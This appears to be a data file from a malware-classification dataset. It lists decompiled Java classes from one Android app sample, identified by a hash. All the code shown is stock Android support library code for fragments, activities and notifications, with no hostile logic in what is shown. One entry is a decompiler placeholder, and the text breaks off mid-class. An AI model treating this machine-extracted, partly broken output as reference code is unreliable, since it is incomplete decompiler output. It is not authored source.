"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ActionBarDrawerToggleImplHC.code","private static class ActionBarDrawerToggleImplHC implements ActionBarDrawerToggleImpl {   private ActionBarDrawerToggleImplHC(){   }   @Override public Drawable getThemeUpIndicator(  Activity activity){     return ActionBarDrawerToggleHoneycomb.getThemeUpIndicator(activity);   }   @Override public Object setActionBarUpIndicator(  Object info,  Activity activity,  Drawable themeImage,  int contentDescRes){     return ActionBarDrawerToggleHoneycomb.setActionBarUpIndicator(info,activity,themeImage,contentDescRes);   }   @Override public Object setActionBarDescription(  Object info,  Activity activity,  int contentDescRes){     return ActionBarDrawerToggleHoneycomb.setActionBarDescription(info,activity,contentDescRes);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ActivityCompat.code","public class ActivityCompat extends ContextCompat {   public static boolean invalidateOptionsMenu(  Activity activity){     if (Build.VERSION.SDK_INT < 11) {       return false;     }     ActivityCompatHoneycomb.invalidateOptionsMenu(activity);     return true;   }   public static void startActivity(  Activity activity,  Intent intent,  Bundle options){     if (Build.VERSION.SDK_INT >= 16) {       ActivityCompatJB.startActivity(activity,intent,options);     }  else {       activity.startActivity(intent);     }   }   public static void startActivityForResult(  Activity activity,  Intent intent,  int requestCode,  Bundle options){     if (Build.VERSION.SDK_INT >= 16) {       ActivityCompatJB.startActivityForResult(activity,intent,requestCode,options);     }  else {       activity.startActivityForResult(intent,requestCode);     }   }   public static void finishAffinity(  Activity activity){     if (Build.VERSION.SDK_INT >= 16) {       ActivityCompatJB.finishAffinity(activity);     }  else {       activity.finish();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ActivityCompatHoneycomb.code","class ActivityCompatHoneycomb {   ActivityCompatHoneycomb(){   }   public static void invalidateOptionsMenu(  Activity activity){     activity.invalidateOptionsMenu();   }   static void dump(  Activity activity,  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     activity.dump(prefix,fd,writer,args);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ActivityCompatJB.code","class ActivityCompatJB {   ActivityCompatJB(){   }   public static void startActivity(  Context context,  Intent intent,  Bundle options){     context.startActivity(intent,options);   }   public static void startActivityForResult(  Activity activity,  Intent intent,  int requestCode,  Bundle options){     activity.startActivityForResult(intent,requestCode,options);   }   public static void finishAffinity(  Activity activity){     activity.finishAffinity();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ActivityOptionsCompat.code","public class ActivityOptionsCompat {   public static ActivityOptionsCompat makeCustomAnimation(  Context context,  int enterResId,  int exitResId){     return Build.VERSION.SDK_INT >= 16 ? new ActivityOptionsImplJB(ActivityOptionsCompatJB.makeCustomAnimation(context,enterResId,exitResId)) : new ActivityOptionsCompat();   }   public static ActivityOptionsCompat makeScaleUpAnimation(  View source,  int startX,  int startY,  int startWidth,  int startHeight){     return Build.VERSION.SDK_INT >= 16 ? new ActivityOptionsImplJB(ActivityOptionsCompatJB.makeScaleUpAnimation(source,startX,startY,startWidth,startHeight)) : new ActivityOptionsCompat();   }   public static ActivityOptionsCompat makeThumbnailScaleUpAnimation(  View source,  Bitmap thumbnail,  int startX,  int startY){     return Build.VERSION.SDK_INT >= 16 ? new ActivityOptionsImplJB(ActivityOptionsCompatJB.makeThumbnailScaleUpAnimation(source,thumbnail,startX,startY)) : new ActivityOptionsCompat();   } private static class ActivityOptionsImplJB extends ActivityOptionsCompat {     private final ActivityOptionsCompatJB mImpl;     ActivityOptionsImplJB(    ActivityOptionsCompatJB impl){       this.mImpl=impl;     }     @Override public Bundle toBundle(){       return this.mImpl.toBundle();     }     @Override public void update(    ActivityOptionsCompat otherOptions){       if (otherOptions instanceof ActivityOptionsImplJB) {         ActivityOptionsImplJB otherImpl=(ActivityOptionsImplJB)otherOptions;         this.mImpl.update(otherImpl.mImpl);       }     }   }   protected ActivityOptionsCompat(){   }   public Bundle toBundle(){     return null;   }   public void update(  ActivityOptionsCompat otherOptions){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ActivityOptionsCompatJB.code","class ActivityOptionsCompatJB {   private final ActivityOptions mActivityOptions;   public static ActivityOptionsCompatJB makeCustomAnimation(  Context context,  int enterResId,  int exitResId){     return new ActivityOptionsCompatJB(ActivityOptions.makeCustomAnimation(context,enterResId,exitResId));   }   public static ActivityOptionsCompatJB makeScaleUpAnimation(  View source,  int startX,  int startY,  int startWidth,  int startHeight){     return new ActivityOptionsCompatJB(ActivityOptions.makeScaleUpAnimation(source,startX,startY,startWidth,startHeight));   }   public static ActivityOptionsCompatJB makeThumbnailScaleUpAnimation(  View source,  Bitmap thumbnail,  int startX,  int startY){     return new ActivityOptionsCompatJB(ActivityOptions.makeThumbnailScaleUpAnimation(source,thumbnail,startX,startY));   }   private ActivityOptionsCompatJB(  ActivityOptions activityOptions){     this.mActivityOptions=activityOptions;   }   public Bundle toBundle(){     return this.mActivityOptions.toBundle();   }   public void update(  ActivityOptionsCompatJB otherOptions){     this.mActivityOptions.update(otherOptions.mActivityOptions);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ActivityOptionsImplJB.code","private static class ActivityOptionsImplJB extends ActivityOptionsCompat {   private final ActivityOptionsCompatJB mImpl;   ActivityOptionsImplJB(  ActivityOptionsCompatJB impl){     this.mImpl=impl;   }   @Override public Bundle toBundle(){     return this.mImpl.toBundle();   }   @Override public void update(  ActivityOptionsCompat otherOptions){     if (otherOptions instanceof ActivityOptionsImplJB) {       ActivityOptionsImplJB otherImpl=(ActivityOptionsImplJB)otherOptions;       this.mImpl.update(otherImpl.mImpl);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\BackStackEntry.code","public interface BackStackEntry {   CharSequence getBreadCrumbShortTitle();   int getBreadCrumbShortTitleRes();   CharSequence getBreadCrumbTitle();   int getBreadCrumbTitleRes();   int getId();   String getName(); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\BackStackRecord.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6c37c36"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\BackStackState.code","public final class BackStackState implements Parcelable {   public static final Parcelable.Creator<BackStackState> CREATOR=new Parcelable.Creator<BackStackState>(){     @Override public BackStackState createFromParcel(    Parcel in){       return new BackStackState(in);     }     @Override public BackStackState[] newArray(    int size){       return new BackStackState[size];     }   } ;   final int mBreadCrumbShortTitleRes;   final CharSequence mBreadCrumbShortTitleText;   final int mBreadCrumbTitleRes;   final CharSequence mBreadCrumbTitleText;   final int mIndex;   final String mName;   final int[] mOps;   final int mTransition;   final int mTransitionStyle;   public BackStackState(  FragmentManagerImpl fm,  BackStackRecord bse){     int pos;     int numRemoved=0;     for (BackStackRecord.Op op=bse.mHead; op != null; op=op.next) {       if (op.removed != null) {         numRemoved+=op.removed.size();       }     }     this.mOps=new int[(bse.mNumOp * 7) + numRemoved];     if (!bse.mAddToBackStack) {       throw new IllegalStateException(""Not on back stack"");     }     BackStackRecord.Op op2=bse.mHead;     int pos2=0;     while (op2 != null) {       int pos3=pos2 + 1;       this.mOps[pos2]=op2.cmd;       int pos4=pos3 + 1;       this.mOps[pos3]=op2.fragment != null ? op2.fragment.mIndex : -1;       int pos5=pos4 + 1;       this.mOps[pos4]=op2.enterAnim;       int pos6=pos5 + 1;       this.mOps[pos5]=op2.exitAnim;       int pos7=pos6 + 1;       this.mOps[pos6]=op2.popEnterAnim;       int pos8=pos7 + 1;       this.mOps[pos7]=op2.popExitAnim;       if (op2.removed != null) {         int N=op2.removed.size();         this.mOps[pos8]=N;         int i=0;         int pos9=pos8 + 1;         while (i < N) {           this.mOps[pos9]=op2.removed.get(i).mIndex;           i++;           pos9++;         }         pos=pos9;       }  else {         pos=pos8 + 1;         this.mOps[pos8]=0;       }       op2=op2.next;       pos2=pos;     }     this.mTransition=bse.mTransition;     this.mTransitionStyle=bse.mTransitionStyle;     this.mName=bse.mName;     this.mIndex=bse.mIndex;     this.mBreadCrumbTitleRes=bse.mBreadCrumbTitleRes;     this.mBreadCrumbTitleText=bse.mBreadCrumbTitleText;     this.mBreadCrumbShortTitleRes=bse.mBreadCrumbShortTitleRes;     this.mBreadCrumbShortTitleText=bse.mBreadCrumbShortTitleText;   }   public BackStackState(  Parcel in){     this.mOps=in.createIntArray();     this.mTransition=in.readInt();     this.mTransitionStyle=in.readInt();     this.mName=in.readString();     this.mIndex=in.readInt();     this.mBreadCrumbTitleRes=in.readInt();     this.mBreadCrumbTitleText=(CharSequence)TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(in);     this.mBreadCrumbShortTitleRes=in.readInt();     this.mBreadCrumbShortTitleText=(CharSequence)TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(in);   }   public BackStackRecord instantiate(  FragmentManagerImpl fm){     BackStackRecord bse=new BackStackRecord(fm);     int pos=0;     int num=0;     while (pos < this.mOps.length) {       BackStackRecord.Op op=new BackStackRecord.Op();       int pos2=pos + 1;       op.cmd=this.mOps[pos];       if (FragmentManagerImpl.DEBUG) {         Log.v(""FragmentManager"",""Instantiate "" + bse + "" op #""+ num+ "" base fragment #""+ this.mOps[pos2]);       }       int pos3=pos2 + 1;       int findex=this.mOps[pos2];       if (findex >= 0) {         Fragment f=fm.mActive.get(findex);         op.fragment=f;       }  else {         op.fragment=null;       }       int pos4=pos3 + 1;       op.enterAnim=this.mOps[pos3];       int pos5=pos4 + 1;       op.exitAnim=this.mOps[pos4];       int pos6=pos5 + 1;       op.popEnterAnim=this.mOps[pos5];       int pos7=pos6 + 1;       op.popExitAnim=this.mOps[pos6];       int pos8=pos7 + 1;       int N=this.mOps[pos7];       if (N > 0) {         op.removed=new ArrayList<>(N);         int i=0;         while (i < N) {           if (FragmentManagerImpl.DEBUG) {             Log.v(""FragmentManager"",""Instantiate "" + bse + "" set remove fragment #""+ this.mOps[pos8]);           }           Fragment r=fm.mActive.get(this.mOps[pos8]);           op.removed.add(r);           i++;           pos8++;         }       }       pos=pos8;       bse.addOp(op);       num++;     }     bse.mTransition=this.mTransition;     bse.mTransitionStyle=this.mTransitionStyle;     bse.mName=this.mName;     bse.mIndex=this.mIndex;     bse.mAddToBackStack=true;     bse.mBreadCrumbTitleRes=this.mBreadCrumbTitleRes;     bse.mBreadCrumbTitleText=this.mBreadCrumbTitleText;     bse.mBreadCrumbShortTitleRes=this.mBreadCrumbShortTitleRes;     bse.mBreadCrumbShortTitleText=this.mBreadCrumbShortTitleText;     bse.bumpBackStackNesting(1);     return bse;   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeIntArray(this.mOps);     dest.writeInt(this.mTransition);     dest.writeInt(this.mTransitionStyle);     dest.writeString(this.mName);     dest.writeInt(this.mIndex);     dest.writeInt(this.mBreadCrumbTitleRes);     TextUtils.writeToParcel(this.mBreadCrumbTitleText,dest,0);     dest.writeInt(this.mBreadCrumbShortTitleRes);     TextUtils.writeToParcel(this.mBreadCrumbShortTitleText,dest,0);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\BigPictureStyle.code","public static class BigPictureStyle extends Style {   Bitmap mBigLargeIcon;   boolean mBigLargeIconSet;   Bitmap mPicture;   public BigPictureStyle(){   }   public BigPictureStyle(  Builder builder){     setBuilder(builder);   }   public BigPictureStyle setBigContentTitle(  CharSequence title){     this.mBigContentTitle=title;     return this;   }   public BigPictureStyle setSummaryText(  CharSequence cs){     this.mSummaryText=cs;     this.mSummaryTextSet=true;     return this;   }   public BigPictureStyle bigPicture(  Bitmap b){     this.mPicture=b;     return this;   }   public BigPictureStyle bigLargeIcon(  Bitmap b){     this.mBigLargeIcon=b;     this.mBigLargeIconSet=true;     return this;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\BigTextStyle.code","public static class BigTextStyle extends Style {   CharSequence mBigText;   public BigTextStyle(){   }   public BigTextStyle(  Builder builder){     setBuilder(builder);   }   public BigTextStyle setBigContentTitle(  CharSequence title){     this.mBigContentTitle=title;     return this;   }   public BigTextStyle setSummaryText(  CharSequence cs){     this.mSummaryText=cs;     this.mSummaryTextSet=true;     return this;   }   public BigTextStyle bigText(  CharSequence cs){     this.mBigText=cs;     return this;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\Builder.code","public static class Builder {   CharSequence mContentInfo;   PendingIntent mContentIntent;   CharSequence mContentText;   CharSequence mContentTitle;   Context mContext;   PendingIntent mFullScreenIntent;   Bitmap mLargeIcon;   int mNumber;   int mPriority;   int mProgress;   boolean mProgressIndeterminate;   int mProgressMax;   Style mStyle;   CharSequence mSubText;   RemoteViews mTickerView;   boolean mUseChronometer;   ArrayList<Action> mActions=new ArrayList<>();   Notification mNotification=new Notification();   public Builder(  Context context){     this.mContext=context;     this.mNotification.when=System.currentTimeMillis();     this.mNotification.audioStreamType=-1;     this.mPriority=0;   }   public Builder setWhen(  long when){     this.mNotification.when=when;     return this;   }   public Builder setUsesChronometer(  boolean b){     this.mUseChronometer=b;     return this;   }   public Builder setSmallIcon(  int icon){     this.mNotification.icon=icon;     return this;   }   public Builder setSmallIcon(  int icon,  int level){     this.mNotification.icon=icon;     this.mNotification.iconLevel=level;     return this;   }   public Builder setContentTitle(  CharSequence title){     this.mContentTitle=title;     return this;   }   public Builder setContentText(  CharSequence text){     this.mContentText=text;     return this;   }   public Builder setSubText(  CharSequence text){     this.mSubText=text;     return this;   }   public Builder setNumber(  int number){     this.mNumber=number;     return this;   }   public Builder setContentInfo(  CharSequence info){     this.mContentInfo=info;     return this;   }   public Builder setProgress(  int max,  int progress,  boolean indeterminate){     this.mProgressMax=max;     this.mProgress=progress;     this.mProgressIndeterminate=indeterminate;     return this;   }   public Builder setContent(  RemoteViews views){     this.mNotification.contentView=views;     return this;   }   public Builder setContentIntent(  PendingIntent intent){     this.mContentIntent=intent;     return this;   }   public Builder setDeleteIntent(  PendingIntent intent){     this.mNotification.deleteIntent=intent;     return this;   }   public Builder setFullScreenIntent(  PendingIntent intent,  boolean highPriority){     this.mFullScreenIntent=intent;     setFlag(128,highPriority);     return this;   }   public Builder setTicker(  CharSequence tickerText){     this.mNotification.tickerText=tickerText;     return this;   }   public Builder setTicker(  CharSequence tickerText,  RemoteViews views){     this.mNotification.tickerText=tickerText;     this.mTickerView=views;     return this;   }   public Builder setLargeIcon(  Bitmap icon){     this.mLargeIcon=icon;     return this;   }   public Builder setSound(  Uri sound){     this.mNotification.sound=sound;     this.mNotification.audioStreamType=-1;     return this;   }   public Builder setSound(  Uri sound,  int streamType){     this.mNotification.sound=sound;     this.mNotification.audioStreamType=streamType;     return this;   }   public Builder setVibrate(  long[] pattern){     this.mNotification.vibrate=pattern;     return this;   }   public Builder setLights(  int argb,  int onMs,  int offMs){     this.mNotification.ledARGB=argb;     this.mNotification.ledOnMS=onMs;     this.mNotification.ledOffMS=offMs;     boolean showLights=(this.mNotification.ledOnMS == 0 || this.mNotification.ledOffMS == 0) ? false : true;     this.mNotification.flags=(showLights ? 1 : 0) | (this.mNotification.flags & (-2));     return this;   }   public Builder setOngoing(  boolean ongoing){     setFlag(2,ongoing);     return this;   }   public Builder setOnlyAlertOnce(  boolean onlyAlertOnce){     setFlag(8,onlyAlertOnce);     return this;   }   public Builder setAutoCancel(  boolean autoCancel){     setFlag(16,autoCancel);     return this;   }   public Builder setDefaults(  int defaults){     this.mNotification.defaults=defaults;     if ((defaults & 4) != 0) {       this.mNotification.flags|=1;     }     return this;   }   private void setFlag(  int mask,  boolean value){     if (value) {       this.mNotification.flags|=mask;     }  else {       this.mNotification.flags&=mask ^ (-1);     }   }   public Builder setPriority(  int pri){     this.mPriority=pri;     return this;   }   public Builder addAction(  int icon,  CharSequence title,  PendingIntent intent){     this.mActions.add(new Action(icon,title,intent));     return this;   }   public Builder setStyle(  Style style){     if (this.mStyle != style) {       this.mStyle=style;       if (this.mStyle != null) {         this.mStyle.setBuilder(this);       }     }     return this;   }   @Deprecated public Notification getNotification(){     return NotificationCompat.IMPL.build(this);   }   public Notification build(){     return NotificationCompat.IMPL.build(this);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\Delegate.code","public interface Delegate {   Drawable getThemeUpIndicator();   void setActionBarDescription(  int i);   void setActionBarUpIndicator(  Drawable drawable,  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\DelegateProvider.code","public interface DelegateProvider {   Delegate getDrawerToggleDelegate(); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\DialogFragment.code","public class DialogFragment extends Fragment implements DialogInterface.OnCancelListener, DialogInterface.OnDismissListener {   private static final String SAVED_BACK_STACK_ID=""android:backStackId"";   private static final String SAVED_CANCELABLE=""android:cancelable"";   private static final String SAVED_DIALOG_STATE_TAG=""android:savedDialogState"";   private static final String SAVED_SHOWS_DIALOG=""android:showsDialog"";   private static final String SAVED_STYLE=""android:style"";   private static final String SAVED_THEME=""android:theme"";   public static final int STYLE_NORMAL=0;   public static final int STYLE_NO_FRAME=2;   public static final int STYLE_NO_INPUT=3;   public static final int STYLE_NO_TITLE=1;   Dialog mDialog;   boolean mDismissed;   boolean mShownByMe;   boolean mViewDestroyed;   int mStyle=0;   int mTheme=0;   boolean mCancelable=true;   boolean mShowsDialog=true;   int mBackStackId=-1;   public void setStyle(  int style,  int theme){     this.mStyle=style;     if (this.mStyle == 2 || this.mStyle == 3) {       this.mTheme=R.style.Theme.Panel;     }     if (theme != 0) {       this.mTheme=theme;     }   }   public void show(  FragmentManager manager,  String tag){     this.mDismissed=false;     this.mShownByMe=true;     FragmentTransaction ft=manager.beginTransaction();     ft.add(this,tag);     ft.commit();   }   public int show(  FragmentTransaction transaction,  String tag){     this.mDismissed=false;     this.mShownByMe=true;     transaction.add(this,tag);     this.mViewDestroyed=false;     this.mBackStackId=transaction.commit();     return this.mBackStackId;   }   public void dismiss(){     dismissInternal(false);   }   public void dismissAllowingStateLoss(){     dismissInternal(true);   }   void dismissInternal(  boolean allowStateLoss){     if (!this.mDismissed) {       this.mDismissed=true;       this.mShownByMe=false;       if (this.mDialog != null) {         this.mDialog.dismiss();         this.mDialog=null;       }       this.mViewDestroyed=true;       if (this.mBackStackId >= 0) {         getFragmentManager().popBackStack(this.mBackStackId,1);         this.mBackStackId=-1;         return;       }       FragmentTransaction ft=getFragmentManager().beginTransaction();       ft.remove(this);       if (allowStateLoss) {         ft.commitAllowingStateLoss();       }  else {         ft.commit();       }     }   }   public Dialog getDialog(){     return this.mDialog;   }   public int getTheme(){     return this.mTheme;   }   public void setCancelable(  boolean cancelable){     this.mCancelable=cancelable;     if (this.mDialog != null) {       this.mDialog.setCancelable(cancelable);     }   }   public boolean isCancelable(){     return this.mCancelable;   }   public void setShowsDialog(  boolean showsDialog){     this.mShowsDialog=showsDialog;   }   public boolean getShowsDialog(){     return this.mShowsDialog;   }   @Override public void onAttach(  Activity activity){     super.onAttach(activity);     if (!this.mShownByMe) {       this.mDismissed=false;     }   }   @Override public void onDetach(){     super.onDetach();     if (!this.mShownByMe && !this.mDismissed) {       this.mDismissed=true;     }   }   @Override public void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     this.mShowsDialog=this.mContainerId == 0;     if (savedInstanceState != null) {       this.mStyle=savedInstanceState.getInt(SAVED_STYLE,0);       this.mTheme=savedInstanceState.getInt(SAVED_THEME,0);       this.mCancelable=savedInstanceState.getBoolean(SAVED_CANCELABLE,true);       this.mShowsDialog=savedInstanceState.getBoolean(SAVED_SHOWS_DIALOG,this.mShowsDialog);       this.mBackStackId=savedInstanceState.getInt(SAVED_BACK_STACK_ID,-1);     }   }   @Override public LayoutInflater getLayoutInflater(  Bundle savedInstanceState){     if (!this.mShowsDialog) {       return super.getLayoutInflater(savedInstanceState);     }     this.mDialog=onCreateDialog(savedInstanceState); switch (this.mStyle) { case 3:       this.mDialog.getWindow().addFlags(24); case 1: case 2:     this.mDialog.requestWindowFeature(1);   break; } if (this.mDialog != null) { return (LayoutInflater)this.mDialog.getContext().getSystemService(""layout_inflater""); } return (LayoutInflater)this.mActivity.getSystemService(""layout_inflater""); } public Dialog onCreateDialog(Bundle savedInstanceState){ return new Dialog(getActivity(),getTheme()); } @Override public void onCancel(DialogInterface dialog){ } @Override public void onDismiss(DialogInterface dialog){ if (!this.mViewDestroyed) { dismissInternal(true); } } @Override public void onActivityCreated(Bundle savedInstanceState){ Bundle dialogState; super.onActivityCreated(savedInstanceState); if (this.mShowsDialog) { View view=getView(); if (view != null) {   if (view.getParent() != null) {     throw new IllegalStateException(""DialogFragment can not be attached to a container view"");   }   this.mDialog.setContentView(view); } this.mDialog.setOwnerActivity(getActivity()); this.mDialog.setCancelable(this.mCancelable); this.mDialog.setOnCancelListener(this); this.mDialog.setOnDismissListener(this); if (savedInstanceState != null && (dialogState=savedInstanceState.getBundle(SAVED_DIALOG_STATE_TAG)) != null) {   this.mDialog.onRestoreInstanceState(dialogState); } } } @Override public void onStart(){ super.onStart(); if (this.mDialog != null) { this.mViewDestroyed=false; this.mDialog.show(); } } @Override public void onSaveInstanceState(Bundle outState){ Bundle dialogState; super.onSaveInstanceState(outState); if (this.mDialog != null && (dialogState=this.mDialog.onSaveInstanceState()) != null) { outState.putBundle(SAVED_DIALOG_STATE_TAG,dialogState); } if (this.mStyle != 0) { outState.putInt(SAVED_STYLE,this.mStyle); } if (this.mTheme != 0) { outState.putInt(SAVED_THEME,this.mTheme); } if (!this.mCancelable) { outState.putBoolean(SAVED_CANCELABLE,this.mCancelable); } if (!this.mShowsDialog) { outState.putBoolean(SAVED_SHOWS_DIALOG,this.mShowsDialog); } if (this.mBackStackId != -1) { outState.putInt(SAVED_BACK_STACK_ID,this.mBackStackId); } } @Override public void onStop(){ super.onStop(); if (this.mDialog != null) { this.mDialog.hide(); } } @Override public void onDestroyView(){ super.onDestroyView(); if (this.mDialog != null) { this.mViewDestroyed=true; this.mDialog.dismiss(); this.mDialog=null; } } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\DummyTabFactory.code","static class DummyTabFactory implements TabHost.TabContentFactory {   private final Context mContext;   public DummyTabFactory(  Context context){     this.mContext=context;   }   @Override public View createTabContent(  String tag){     View v=new View(this.mContext);     v.setMinimumWidth(0);     v.setMinimumHeight(0);     return v;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\Fragment.code","public class Fragment implements ComponentCallbacks, View.OnCreateContextMenuListener {   static final int ACTIVITY_CREATED=2;   static final int CREATED=1;   static final int INITIALIZING=0;   static final int RESUMED=5;   static final int STARTED=4;   static final int STOPPED=3;   private static final SimpleArrayMap<String,Class<?>> sClassMap=new SimpleArrayMap<>();   FragmentActivity mActivity;   boolean mAdded;   View mAnimatingAway;   Bundle mArguments;   int mBackStackNesting;   boolean mCalled;   boolean mCheckedForLoaderManager;   FragmentManagerImpl mChildFragmentManager;   ViewGroup mContainer;   int mContainerId;   boolean mDeferStart;   boolean mDetached;   int mFragmentId;   FragmentManagerImpl mFragmentManager;   boolean mFromLayout;   boolean mHasMenu;   boolean mHidden;   boolean mInLayout;   View mInnerView;   LoaderManagerImpl mLoaderManager;   boolean mLoadersStarted;   int mNextAnim;   Fragment mParentFragment;   boolean mRemoving;   boolean mRestored;   boolean mResumed;   boolean mRetainInstance;   boolean mRetaining;   Bundle mSavedFragmentState;   SparseArray<Parcelable> mSavedViewState;   int mStateAfterAnimating;   String mTag;   Fragment mTarget;   int mTargetRequestCode;   View mView;   String mWho;   int mState=0;   int mIndex=-1;   int mTargetIndex=-1;   boolean mMenuVisible=true;   boolean mUserVisibleHint=true; public static class SavedState implements Parcelable {     public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){       @Override public SavedState createFromParcel(      Parcel in){         return new SavedState(in,null);       }       @Override public SavedState[] newArray(      int size){         return new SavedState[size];       }     } ;     final Bundle mState;     public SavedState(    Bundle state){       this.mState=state;     }     SavedState(    Parcel in,    ClassLoader loader){       this.mState=in.readBundle();       if (loader != null && this.mState != null) {         this.mState.setClassLoader(loader);       }     }     @Override public int describeContents(){       return 0;     }     @Override public void writeToParcel(    Parcel dest,    int flags){       dest.writeBundle(this.mState);     }   } public static class InstantiationException extends RuntimeException {     public InstantiationException(    String msg,    Exception cause){       super(msg,cause);     }   }   public static Fragment instantiate(  Context context,  String fname){     return instantiate(context,fname,null);   }   public static Fragment instantiate(  Context context,  String fname,  Bundle args){     try {       Class<?> clazz=sClassMap.get(fname);       if (clazz == null) {         clazz=context.getClassLoader().loadClass(fname);         sClassMap.put(fname,clazz);       }       Fragment f=(Fragment)clazz.newInstance();       if (args != null) {         args.setClassLoader(f.getClass().getClassLoader());         f.mArguments=args;       }       return f;     }  catch (    ClassNotFoundException e) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e);     } catch (    IllegalAccessException e2) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e2);     } catch (    java.lang.InstantiationException e3) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e3);     }   }   public static boolean isSupportFragmentClass(  Context context,  String fname){     try {       Class<?> clazz=sClassMap.get(fname);       if (clazz == null) {         clazz=context.getClassLoader().loadClass(fname);         sClassMap.put(fname,clazz);       }       return Fragment.class.isAssignableFrom(clazz);     }  catch (    ClassNotFoundException e) {       return false;     }   }   public final void restoreViewState(  Bundle savedInstanceState){     if (this.mSavedViewState != null) {       this.mInnerView.restoreHierarchyState(this.mSavedViewState);       this.mSavedViewState=null;     }     this.mCalled=false;     onViewStateRestored(savedInstanceState);     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onViewStateRestored()"");     }   }   public final void setIndex(  int index,  Fragment parent){     this.mIndex=index;     if (parent != null) {       this.mWho=parent.mWho + "":"" + this.mIndex;     }  else {       this.mWho=""android:fragment:"" + this.mIndex;     }   }   public final boolean isInBackStack(){     return this.mBackStackNesting > 0;   }   public final boolean equals(  Object o){     return super.equals(o);   }   public final int hashCode(){     return super.hashCode();   }   public String toString(){     StringBuilder sb=new StringBuilder(128);     DebugUtils.buildShortClassTag(this,sb);     if (this.mIndex >= 0) {       sb.append("" #"");       sb.append(this.mIndex);     }     if (this.mFragmentId != 0) {       sb.append("" id=0x"");       sb.append(Integer.toHexString(this.mFragmentId));     }     if (this.mTag != null) {       sb.append("" "");       sb.append(this.mTag);     }     sb.append('}');     return sb.toString();   }   public final int getId(){     return this.mFragmentId;   }   public final String getTag(){     return this.mTag;   }   public void setArguments(  Bundle args){     if (this.mIndex >= 0) {       throw new IllegalStateException(""Fragment already active"");     }     this.mArguments=args;   }   public final Bundle getArguments(){     return this.mArguments;   }   public void setInitialSavedState(  SavedState state){     if (this.mIndex >= 0) {       throw new IllegalStateException(""Fragment already active"");     }     this.mSavedFragmentState=(state == null || state.mState == null) ? null : state.mState;   }   public void setTargetFragment(  Fragment fragment,  int requestCode){     this.mTarget=fragment;     this.mTargetRequestCode=requestCode;   }   public final Fragment getTargetFragment(){     return this.mTarget;   }   public final int getTargetRequestCode(){     return this.mTargetRequestCode;   }   public final FragmentActivity getActivity(){     return this.mActivity;   }   public final Resources getResources(){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     return this.mActivity.getResources();   }   public final CharSequence getText(  int resId){     return getResources().getText(resId);   }   public final String getString(  int resId){     return getResources().getString(resId);   }   public final String getString(  int resId,  Object... formatArgs){     return getResources().getString(resId,formatArgs);   }   public final FragmentManager getFragmentManager(){     return this.mFragmentManager;   }   public final FragmentManager getChildFragmentManager(){     if (this.mChildFragmentManager == null) {       instantiateChildFragmentManager();       if (this.mState >= 5) {         this.mChildFragmentManager.dispatchResume();       }  else       if (this.mState >= 4) {         this.mChildFragmentManager.dispatchStart();       }  else       if (this.mState >= 2) {         this.mChildFragmentManager.dispatchActivityCreated();       }  else       if (this.mState >= 1) {         this.mChildFragmentManager.dispatchCreate();       }     }     return 